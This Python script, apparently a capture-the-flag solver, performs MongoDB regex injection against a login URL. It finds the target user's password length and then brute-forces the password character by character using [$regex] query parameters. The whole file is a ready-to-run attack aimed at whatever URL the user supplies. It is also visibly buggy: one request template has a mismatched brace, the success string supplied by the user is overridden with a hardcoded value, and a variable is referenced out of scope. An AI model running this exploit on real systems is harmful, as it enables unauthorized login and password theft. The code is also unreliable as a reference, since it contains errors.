import requests
import string
from urllib.parse import urljoin

class solver:

	def __init__(self, _url: str, _cn_id: str, _cn_pw: str, _id: str, success_sign: str, pw_hint:str) -> None:
		self._target_url = _url
		self._login_url = urljoin(self._target_url, "login")	# http://*@#$@/login
		self._cn_id = _cn_id
		self._cn_pw = _cn_pw
		self._id = _id
		#self.success_sign = success_sign
		self.success_sign = 'admin'
		self.pw_hint = pw_hint


	def _mongo_login(self, res_str: str, tmp_chr : chr) -> requests.Response:
		response = requests.get(f'{self._login_url}?{self._cn_id}[$regex]={self._id}&{self._cn_pw}[$regex]={res_str}{tmp_chr}')
		return response

	def _find_passwd_len(self) -> int:
		a = '{'
		b = '}'
		for num in range(1,100):
			print(f"{self._login_url}?{self._cn_id}[$regex]={self._id}&{self._cn_pw}[$regex]=^.{a}{num},{b}")
			response = requests.get(f"{self._login_url}?{self._cn_id}[$regex]={self._id}&{self._cn_pw}[$regex]=^.{a}{num},{a}")
			print(response.text)
			if response.text != self.success_sign:
				print(f"Now, I get password len : {num}")
				return num-1
	
	def _find_password(self):
		passwd_len = self._find_passwd_len()
		res_str = pw_hint
		ALPHANUMERIC = string.digits + string.ascii_letters
		for num in range(0,passwd_len+1):
			for tmp_chr in ALPHANUMERIC:
				response = self._mongo_login(res_str,tmp_chr)
				if response.text == self.success_sign:
					res_str += tmp_chr
					break

		print(f"Finally, I get user's password : {res_str}")
		



if __name__ == "__main__":
	_url = input("Input target URL: ")
	_cn_id = input("Input name of id's column: ")
	_cn_pw = input("Input name of pw's column: ")
	_id = input("Input target id: ")
	success_sign = input("Input text of successful login: ")
	pw_hint = input("If you have any hint of pw, write here ->")
	sol = solver(_url,_cn_id,_cn_pw,_id,success_sign,pw_hint)
	sol._find_password()
